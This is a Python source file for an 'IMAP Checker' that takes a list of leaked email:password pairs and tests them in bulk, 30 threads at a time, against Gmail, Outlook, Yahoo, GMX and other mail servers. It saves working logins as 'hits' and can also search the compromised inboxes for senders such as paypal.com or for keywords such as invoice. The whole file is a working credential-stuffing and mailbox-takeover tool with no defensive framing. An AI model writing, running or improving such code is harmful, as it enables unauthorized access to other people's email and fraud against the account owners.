import imaplib
import threading
import os
import time
import ssl
import re
from datetime import datetime, timedelta
from queue import Queue, Empty
from tkinter import filedialog, Tk
import random
import sys

# Import Config and Util
try:
    from Config.Util import *
    from Config.Config import *
    from Config.ConfigManager import config_manager
except ImportError:
    # Fallback for standalone testing (though in this environment it should work)
    print("Error importing Config.Util")
    sys.exit()

class LostMail:
    def __init__(self):
        self.hits = 0
        self.invalids = 0
        self.total_checked = 0
        self.errors = 0
        self.no_server = 0
        self.start_time = time.time()
        self.total_combos = 0
        self.lock = threading.Lock()
        self.running = True
        self.search_term = None
        self.search_type = None
        self.search_enabled = False
        self.results = {'hits': [], 'invalids': [], 'errors': []}
        self.domains = self.load_domains()
        
        self.results_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'Results', 'IMAP Checker')
        if not os.path.exists(self.results_dir):
            os.makedirs(self.results_dir)
            
        self.output_files = {
            'hits_clean': os.path.join(self.results_dir, 'Hits.txt'),
            'hits_full': os.path.join(self.results_dir, 'Hits_Full.txt'),
            'hits_detailed': os.path.join(self.results_dir, 'Hits_Detailed.txt'),
            'keyword_results': os.path.join(self.results_dir, 'Keyword_Results.txt')
        }
        
        # Initialize files
        for file_path in self.output_files.values():
            try:
                with open(file_path, 'a', encoding='utf-8') as f:
                    pass
            except:
                pass
    
    def load_domains(self):
        domains = {
            'gmail.com': [{'server': 'imap.gmail.com', 'port': 993, 'ssl': True}],
            'googlemail.com': [{'server': 'imap.gmail.com', 'port': 993, 'ssl': True}],
            'outlook.com': [{'server': 'outlook.office365.com', 'port': 993, 'ssl': True}],
            'hotmail.com': [{'server': 'outlook.office365.com', 'port': 993, 'ssl': True}],
            'live.com': [{'server': 'outlook.office365.com', 'port': 993, 'ssl': True}],
            'msn.com': [{'server': 'outlook.office365.com', 'port': 993, 'ssl': True}],
            'yahoo.com': [{'server': 'imap.mail.yahoo.com', 'port': 993, 'ssl': True}],
            'yahoo.de': [{'server': 'imap.mail.yahoo.com', 'port': 993, 'ssl': True}],
            'yahoo.co.uk': [{'server': 'imap.mail.yahoo.com', 'port': 993, 'ssl': True}],
            'yahoo.fr': [{'server': 'imap.mail.yahoo.com', 'port': 993, 'ssl': True}],
            'yahoo.it': [{'server': 'imap.mail.yahoo.com', 'port': 993, 'ssl': True}],
            'ymail.com': [{'server': 'imap.mail.yahoo.com', 'port': 993, 'ssl': True}],
            'gmx.de': [{'server': 'imap.gmx.net', 'port': 993, 'ssl': True}],
            'gmx.com': [{'server': 'imap.gmx.com', 'port': 993, 'ssl': True}],
            'gmx.at': [{'server': 'imap.gmx.at', 'port': 993, 'ssl': True}],
            'web.de': [{'server': 'imap.web.de', 'port': 993, 'ssl': True}],
            't-online.de': [{'server': 'secureimap.t-online.de', 'port': 993, 'ssl': True}],
            '1und1.de': [{'server': 'imap.1und1.de', 'port': 993, 'ssl': True}],
            'freenet.de': [{'server': 'mx.freenet.de', 'port': 993, 'ssl': True}],
            'arcor.de': [{'server': 'imap.arcor.de', 'port': 993, 'ssl': True}],
            'libero.it': [{'server': 'imapmail.libero.it', 'port': 993, 'ssl': True}],
            'virgilio.it': [{'server': 'box.virgilio.it', 'port': 993, 'ssl': True}],
            'alice.it': [{'server': 'in.alice.it', 'port': 993, 'ssl': True}],
            'tin.it': [{'server': 'box.tin.it', 'port': 993, 'ssl': True}],
            'tiscali.it': [{'server': 'imapmail.tiscali.it', 'port': 993, 'ssl': True}],
            'poste.it': [{'server': 'imaps.poste.it', 'port': 993, 'ssl': True}],
            'orange.fr': [{'server': 'imap.orange.fr', 'port': 993, 'ssl': True}],
            'free.fr': [{'server': 'imap.free.fr', 'port': 993, 'ssl': True}],
            'wanadoo.fr': [{'server': 'imap.orange.fr', 'port': 993, 'ssl': True}],
            'sfr.fr': [{'server': 'imap.sfr.fr', 'port': 993, 'ssl': True}],
            'laposte.net': [{'server': 'imap.laposte.net', 'port': 993, 'ssl': True}],
            'aol.com': [{'server': 'imap.aol.com', 'port': 993, 'ssl': True}],
            'icloud.com': [{'server': 'imap.mail.me.com', 'port': 993, 'ssl': True}],
            'me.com': [{'server': 'imap.mail.me.com', 'port': 993, 'ssl': True}],
            'yandex.com': [{'server': 'imap.yandex.com', 'port': 993, 'ssl': True}],
            'yandex.ru': [{'server': 'imap.yandex.ru', 'port': 993, 'ssl': True}],
            'mail.ru': [{'server': 'imap.mail.ru', 'port': 993, 'ssl': True}],
            'zoho.com': [{'server': 'imap.zoho.com', 'port': 993, 'ssl': True}],
            'protonmail.com': [{'server': 'imap.protonmail.com', 'port': 993, 'ssl': True}]
        }
        
        # Load domains from file in the same directory
        domains_path = os.path.join(os.path.dirname(__file__), 'domains.txt')
        if os.path.exists(domains_path):
            try:
                with open(domains_path, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if '|' in line and not line.startswith('#'):
                            parts = line.split('|')
                            if len(parts) >= 2:
                                domain = parts[0].strip()
                                server = parts[1].strip()
                                port = int(parts[2]) if len(parts) > 2 and parts[2].strip().isdigit() else 993
                                ssl_enabled = parts[3].lower() == 'true' if len(parts) > 3 else True
                                
                                if domain not in domains:
                                    domains[domain] = [{
                                        'server': server,
                                        'port': port,
                                        'ssl': ssl_enabled
                                    }]
            except:
                pass
        
        return domains
    
    def create_ssl_context(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        context.set_ciphers('DEFAULT@SECLEVEL=1')
        context.minimum_version = ssl.TLSVersion.TLSv1
        return context
    
    def create_connection(self, config, timeout=12):
        try:
            if config['ssl']:
                context = self.create_ssl_context()
                mail = imaplib.IMAP4_SSL(
                    config['server'],
                    config['port'],
                    timeout=timeout,
                    ssl_context=context
                )
            else:
                mail = imaplib.IMAP4(config['server'], config['port'], timeout=timeout)
                mail.starttls(ssl_context=self.create_ssl_context())
            
            return mail
        except:
            return None
    
    def perform_search(self, mail, search_term, search_type):
        search_results = {'total_found': 0, 'recent_count': 0}
        
        try:
            mail.select('INBOX')
            
            if search_type == 'sender':
                patterns = [
                    f'FROM "{search_term}"',
                    f'FROM {search_term}',
                    f'HEADER FROM {search_term}'
                ]
                
                max_count = 0
                for pattern in patterns:
                    try:
                        status, data = mail.search(None, pattern)
                        if status == 'OK' and data[0]:
                            count = len(data[0].split())
                            max_count = max(max_count, count)
                    except:
                        continue
                
                search_results['total_found'] = max_count
                
            elif search_type == 'keyword':
                search_locations = [
                    f'SUBJECT "{search_term}"',
                    f'BODY "{search_term}"'
                ]
                
                total_ids = set()
                for location in search_locations:
                    try:
                        status, data = mail.search(None, location)
                        if status == 'OK' and data[0]:
                            ids = data[0].split()
                            total_ids.update(ids)
                    except:
                        continue
                
                search_results['total_found'] = len(total_ids)
            
            try:
                since_date = (datetime.now() - timedelta(days=30)).strftime('%d-%b-%Y')
                if search_type == 'sender':
                    status, data = mail.search(None, f'FROM {search_term} SINCE {since_date}')
                else:
                    status, data = mail.search(None, f'TEXT "{search_term}" SINCE {since_date}')
                
                if status == 'OK' and data[0]:
                    search_results['recent_count'] = len(data[0].split())
            except:
                pass
                
        except:
            pass
        
        return search_results
    
    def get_account_info(self, mail):
        info = {}
        
        try:
            mail.select('INBOX')
            
            status, messages = mail.search(None, 'ALL')
            if status == 'OK':
                info['total_emails'] = len(messages[0].split()) if messages[0] else 0
            
            status, unread = mail.search(None, 'UNSEEN')
            if status == 'OK':
                info['unread_emails'] = len(unread[0].split()) if unread[0] else 0
            
            try:
                if messages[0]:
                    email_ids = messages[0].split()
                    if email_ids:
                        latest_id = email_ids[-1]
                        status, msg_data = mail.fetch(latest_id, '(INTERNALDATE)')
                        if status == 'OK' and msg_data[0]:
                            date_str = msg_data[0].decode()
                            date_match = re.search(r'INTERNALDATE "([^"]+)"', date_str)
                            if date_match:
                                date_part = date_match.group(1)
                                try:
                                    from email.utils import parsedate_to_datetime
                                    parsed_date = parsedate_to_datetime(date_part)
                                    info['last_email'] = parsed_date.strftime('%Y-%m-%d')
                                except:
                                    info['last_email'] = date_part[:10]
            except:
                pass
                
        except:
            pass
        
        return info
    
    def check_single_account(self, email, password):
        result = {
            'email': email,
            'password': password,
            'status': 'unknown',
            'error': None,
            'server_used': None,
            'search_results': {},
            'account_info': {}
        }
        
        domain = email.split('@')[-1].lower()
        
        try:
            configs = self.domains.get(domain, [])
            if not configs:
                result['status'] = 'no_server'
                result['error'] = f'No IMAP server found for domain: {domain}'
                return result
            
            for config in configs:
                try:
                    mail = self.create_connection(config)
                    if not mail:
                        continue
                    
                    try:
                        mail.login(email, password)
                        result['status'] = 'valid'
                        result['server_used'] = f"{config['server']}:{config['port']}"
                        
                        try:
                            result['account_info'] = self.get_account_info(mail)
                        except:
                            pass
                        
                        if self.search_enabled and self.search_term and self.search_type:
                            try:
                                result['search_results'] = self.perform_search(
                                    mail, self.search_term, self.search_type
                                )
                            except:
                                pass
                        
                        try:
                            mail.logout()
                        except:
                            pass
                        
                        return result
                        
                    except imaplib.IMAP4.error as login_error:
                        error_str = str(login_error).lower()
                        
                        if any(phrase in error_str for phrase in [
                            'authentication failed', 'invalid credentials', 'login failed',
                            'auth', 'password', 'username', 'credential'
                        ]):
                            result['status'] = 'invalid'
                            result['error'] = 'Authentication failed'
                            result['server_used'] = f"{config['server']}:{config['port']}"
                        else:
                            result['status'] = 'error'
                            result['error'] = str(login_error)
                        
                        try:
                            mail.logout()
                        except:
                            pass
                        
                        if result['status'] == 'invalid':
                            return result
                            
                    except Exception:
                        try:
                            mail.logout()
                        except:
                            pass
                        continue
                        
                except Exception:
                    continue
            
            if result['status'] == 'unknown':
                result['status'] = 'error'
                result['error'] = 'All IMAP configurations failed'
                
        except Exception as e:
            result['status'] = 'error'
            result['error'] = str(e)
        
        return result
    
    def save_hit_clean(self, result):
        try:
            with open(self.output_files['hits_clean'], 'a', encoding='utf-8') as f:
                f.write(f"{result['email']}:{result['password']}\n")
        except:
            pass
    
    def save_hit_full(self, result):
        try:
            with open(self.output_files['hits_full'], 'a', encoding='utf-8') as f:
                line = f"{result['email']}:{result['password']}"
                
                search_results = result.get('search_results', {})
                if search_results.get('total_found', 0) > 0:
                    line += f" | {self.search_type}:{self.search_term}({search_results['total_found']})"
                    if search_results.get('recent_count', 0) > 0:
                        line += f" | recent({search_results['recent_count']})"
                
                account_info = result.get('account_info', {})
                if account_info.get('total_emails'):
                    line += f" | total({account_info['total_emails']})"
                if account_info.get('unread_emails'):
                    line += f" | unread({account_info['unread_emails']})"
                if account_info.get('last_email'):
                    line += f" | last:{account_info['last_email']}"
                
                f.write(line + '\n')
        except:
            pass
    
    def save_hit_detailed(self, result):
        try:
            with open(self.output_files['hits_detailed'], 'a', encoding='utf-8') as f:
                line = f"{result['email']}:{result['password']}"
                line += f" | Server: {result.get('server_used', 'unknown')}"
                
                account_info = result.get('account_info', {})
                if account_info.get('total_emails'):
                    line += f" | Emails: {account_info['total_emails']}"
                if account_info.get('unread_emails'):
                    line += f" | Unread: {account_info['unread_emails']}"
                if account_info.get('last_email'):
                    line += f" | LastEmail: {account_info['last_email']}"
                
                search_results = result.get('search_results', {})
                if search_results.get('total_found', 0) > 0:
                    line += f" | SearchHits: {search_results['total_found']}"
                
                f.write(line + '\n')
        except:
            pass
    
    def save_keyword_results(self, result):
        if not self.search_enabled or not result.get('search_results', {}).get('total_found', 0) > 0:
            return
            
        try:
            with open(self.output_files['keyword_results'], 'a', encoding='utf-8') as f:
                search_results = result['search_results']
                account_info = result.get('account_info', {})
                
                line = f"{result['email']}:{result['password']}"
                line += f" | {self.search_type}:{self.search_term}({search_results['total_found']})"
                
                if search_results.get('recent_count', 0) > 0:
                    line += f" | recent({search_results['recent_count']})"
                
                if account_info.get('last_email'):
                    line += f" | last:{account_info['last_email']}"
                
                if account_info.get('total_emails'):
                    line += f" | total({account_info['total_emails']})"
                
                f.write(line + '\n')
        except:
            pass
    
    def worker_thread(self, work_queue):
        while self.running:
            try:
                item = work_queue.get(timeout=1)
            except Empty:
                continue
                
            try:
                email, password = item
                result = self.check_single_account(email, password)
                
                with self.lock:
                    self.total_checked += 1
                    
                    if result['status'] == 'valid':
                        self.hits += 1
                        self.save_hit_clean(result)
                        
                        hit_msg = f"{email}:{password} | Server: {result['server_used']}"
                        if result.get('account_info'):
                            hit_msg += f" | {result['account_info']}"
                        if result.get('search_results'):
                            hit_msg += f" | Search: {result['search_results']}"
                            self.save_search_hit(result)
                        
                        print(f"{BEFORE + current_time_hour() + AFTER} {ADD} HIT: {white}{hit_msg}{blue}")
                        
                    elif result['status'] == 'invalid':
                        self.invalids += 1
                        self.results['invalids'].append(result)
                        
                    elif result['status'] == 'no_server':
                        self.no_server += 1
                        
                    else:
                        self.errors += 1
                        self.results['errors'].append(result)
                
            except Exception:
                self.errors += 1
            finally:
                work_queue.task_done()
    
    def display_progress(self):
        while self.running:
            try:
                elapsed = time.time() - self.start_time
                cpm = (self.total_checked / elapsed * 60) if elapsed > 0 else 0
                hit_rate = (self.hits / self.total_checked * 100) if self.total_checked > 0 else 0
                
                eta_seconds = 0
                if self.total_combos > 0 and cpm > 0:
                    remaining = self.total_combos - self.total_checked
                    eta_seconds = (remaining / cpm) * 60
                
                # Format progress using Util style colors
                # Using \r to update the line
                progress = (
                    f"\r{blue}[{white}{current_time_hour()}{blue}] {WAIT} "
                    f"Hits: {white}{self.hits}{blue} | "
                    f"Inv: {white}{self.invalids}{blue} | "
                    f"Err: {white}{self.errors}{blue} | "
                    f"NoSrv: {white}{self.no_server}{blue} | "
                    f"CPM: {white}{cpm:.1f}{blue} | "
                    f"Left: {white}{self.total_combos - self.total_checked}{blue}"
                )
                
                if eta_seconds > 0:
                    eta_minutes = int(eta_seconds // 60)
                    progress += f" | ETA: {white}{eta_minutes}m{blue}"
                
                print(progress, end='', flush=True)
                time.sleep(1)
                
            except:
                continue
    
    def load_combos(self, filename):
        combos = []
        encodings = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
        
        for encoding in encodings:
            try:
                with open(filename, 'r', encoding=encoding, errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                        
                        line = re.sub(r'[^\x20-\x7E]', '', line)
                        
                        if ':' in line and '@' in line:
                            parts = line.split(':', 1)
                        elif '|' in line and '@' in line:
                            parts = line.split('|', 1)
                        else:
                            continue
                        
                        if len(parts) == 2:
                            email_part = parts[0].strip()
                            password_part = parts[1].strip()
                            
                            email_pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
                            if re.match(email_pattern, email_part) and password_part:
                                combos.append((email_part, password_part))
                
                if combos:
                    print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Loaded {white}{len(combos)}{blue} combos using {encoding}")
                    return combos
                    
            except:
                continue
        
        return combos
    
    def run_checker(self, combo_file, num_threads=30):
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Starting IMAP Checker ...")
        
        combos = self.load_combos(combo_file)
        if not combos:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} No valid combos found!")
            return
        
        self.total_combos = len(combos)
        
        if self.search_enabled:
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Search: {white}{self.search_type}{blue} = '{white}{self.search_term}{blue}'")
        
        work_queue = Queue()
        for combo in combos:
            work_queue.put(combo)
        
        threads = []
        for i in range(num_threads):
            t = threading.Thread(target=self.worker_thread, args=(work_queue,))
            t.daemon = True
            t.start()
            threads.append(t)
        
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Started {white}{len(threads)}{blue} worker threads")
        
        progress_thread = threading.Thread(target=self.display_progress)
        progress_thread.daemon = True
        progress_thread.start()
        
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Processing started...")
        print() # Newline for progress bar
        
        try:
            work_queue.join()
        except KeyboardInterrupt:
            print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Stopping checker...")
            self.running = False
        
        self.running = False
        
        for _ in range(num_threads):
            work_queue.put(None)
        
        for t in threads:
            t.join(timeout=2)
        
        self.display_final_results()
    
    def display_final_results(self):
        print(f"\n\n{BEFORE + current_time_hour() + AFTER} {INFO} FINAL RESULTS")
        
        print(f"{BEFORE + current_time_hour() + AFTER} {ADD} Total Hits: {white}{self.hits}{blue}")
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Total Invalid: {white}{self.invalids}{blue}")
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Total Errors: {white}{self.errors}{blue}")
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} No Server: {white}{self.no_server}{blue}")
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Total Checked: {white}{self.total_checked}{blue}")
        
        if self.hits > 0:
            print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Output Files:")
            print(f"   Clean Hits: {self.output_files['hits_clean']}")
            print(f"   Full Results: {self.output_files['hits_full']}")


def main():
    Title("IMAP Checker")
    
    checker = LostMail()
    
    try:
        # Threads Input
        num_threads = config_manager.get_setting('threads')
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Running with {num_threads} threads")
        
        # File Selection
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Select combo file...")
        root = Tk()
        root.withdraw()
        root.attributes('-topmost', True)
        combo_file = filedialog.askopenfilename(
            title="Select Combo File (email:password)",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        root.destroy()
        
        if not combo_file:
            print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} No file selected!")
            time.sleep(2)
            Reset()
            return
        
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Selected: {white}{os.path.basename(combo_file)}{blue}")
        
        # Search Config
        search_input = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Enable search features? (y/n) -> " + reset).lower()
        enable_search = search_input in ['y', 'yes', 'true', '1']
        
        if enable_search:
            checker.search_enabled = True
            
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Search Types:")
            print(f"   1. Sender Search (e.g., paypal.com)")
            print(f"   2. Keyword Search (e.g., invoice)")
            
            search_type_input = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Select type (1/2) -> " + reset)
            
            if search_type_input.strip() == '1':
                checker.search_type = 'sender'
                checker.search_term = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Enter sender (e.g. paypal.com) -> " + reset)
            else:
                checker.search_type = 'keyword'
                checker.search_term = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Enter keyword (e.g. invoice) -> " + reset)
            
            if not checker.search_term:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} No search term provided. Search disabled.")
                checker.search_enabled = False
        
        # Start
        start_input = input(f"\n{BEFORE + current_time_hour() + AFTER} {INPUT} Press Enter to start (or 'n' to cancel) -> " + reset)
        if start_input.lower().strip() == 'n':
            Reset()
            return
        
        checker.run_checker(combo_file, num_threads)
        
        print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Checker completed successfully!")
        
        input(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Press Enter to return to menu..." + reset)
        Reset()
        
    except KeyboardInterrupt:
        print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Checker stopped by user")
        Reset()
    except Exception as e:
        Error(e)

if __name__ == "__main__":
    main()
